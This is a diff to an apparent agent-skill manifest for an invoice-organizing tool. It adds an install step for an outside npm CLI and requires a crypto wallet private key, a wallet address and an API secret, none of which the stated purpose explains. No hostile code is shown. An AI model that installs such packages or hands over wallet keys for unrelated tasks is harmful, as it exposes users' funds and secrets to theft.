@@ -3,6 +3,16 @@ name: invoice-organizer
 version: 0.1.0
 description: "Automatically organizes invoices and receipts for tax preparation by reading messy files, extracting key information, renaming them consistently, and sorting them into logical folders. Turns hours of manual bookkeeping into minutes of automated organization."
 license: "Apache-2.0"
+metadata:
+  openclaw:
+    install:
+      - kind: node
+        package: "@ivaronix/cli"
+        bins: ["ivaronix"]
+        os: ["linux", "darwin", "win32"]
+        label: "Install Ivaronix CLI to run this skill"
+    requires:
+      env: ["EVM_PRIVATE_KEY", "EVM_WALLET_ADDRESS", "ZG_API_SECRET"]
 entrypoint: prompt.md
 
 og:
